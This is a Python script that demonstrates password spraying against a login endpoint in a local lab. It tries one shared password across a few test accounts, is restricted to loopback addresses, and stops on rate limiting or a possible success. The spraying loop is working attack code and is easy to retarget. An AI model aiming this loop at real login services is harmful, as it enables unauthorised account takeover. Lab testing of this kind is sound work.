import requests
import time
from urllib.parse import urlparse
from ipaddress import ip_address

# LOCAL LAB CONFIGURATION
LOGIN_URL = "http://127.0.0.1:5000/login"

# Only accounts you created for your local lab
TEST_USERS = [
    "testuser1",
    "testuser2",
    "testuser3",
    "testuser4",
]

# One candidate password shared across the accounts
CANDIDATE_PASSWORD = "LabTestPassword123!"

# Delay between login attempts
DELAY_SECONDS = 3

# Maximum accounts per run
MAX_ACCOUNTS = 10


def validate_local_url(url):
    parsed = urlparse(url)

    if parsed.scheme != "http":
        raise ValueError("Use HTTP only for this isolated local lab.")

    host = parsed.hostname

    if host == "localhost":
        return

    try:
        address = ip_address(host)
    except ValueError:
        raise ValueError("Target must be localhost or a loopback IP.")

    if not address.is_loopback:
        raise ValueError("Target must be a loopback address.")


def main():
    validate_local_url(LOGIN_URL)

    if not TEST_USERS or len(TEST_USERS) > MAX_ACCOUNTS:
        raise ValueError("Use between 1 and 10 test accounts.")

    session = requests.Session()

    print("\nLOCAL PASSWORD-SPRAYING DEMONSTRATION")
    print("------------------------------------")
    print("Target:", LOGIN_URL)
    print("Accounts:", len(TEST_USERS))
    print("Candidate password: [hidden]")
    print("Delay:", DELAY_SECONDS, "seconds")
    print()

    for index, username in enumerate(TEST_USERS, start=1):

        try:
            response = session.post(
                LOGIN_URL,
                json={
                    "username": username,
                    "password": CANDIDATE_PASSWORD
                },
                timeout=5,
                allow_redirects=False
            )

            print(f"Account {index}: {username}")
            print("HTTP status:", response.status_code)

            if response.status_code == 429:
                print("RATE LIMIT DETECTED")
                print("Retry-After:",
                      response.headers.get("Retry-After"))
                print("Stopping test.")
                break

            if response.status_code in (200, 201):
                print("Authentication may have succeeded.")
                print("Stopping to avoid further login attempts.")
                break

            elif response.status_code in (401, 403):
                print("Authentication rejected.")

            else:
                print("Unexpected response; inspect server logs.")

        except requests.RequestException as error:
            print("Request failed:", error)
            break

        if index < len(TEST_USERS):
            time.sleep(DELAY_SECONDS)

    print("\nTest completed. Review your server logs.")


if __name__ == "__main__":
    main()
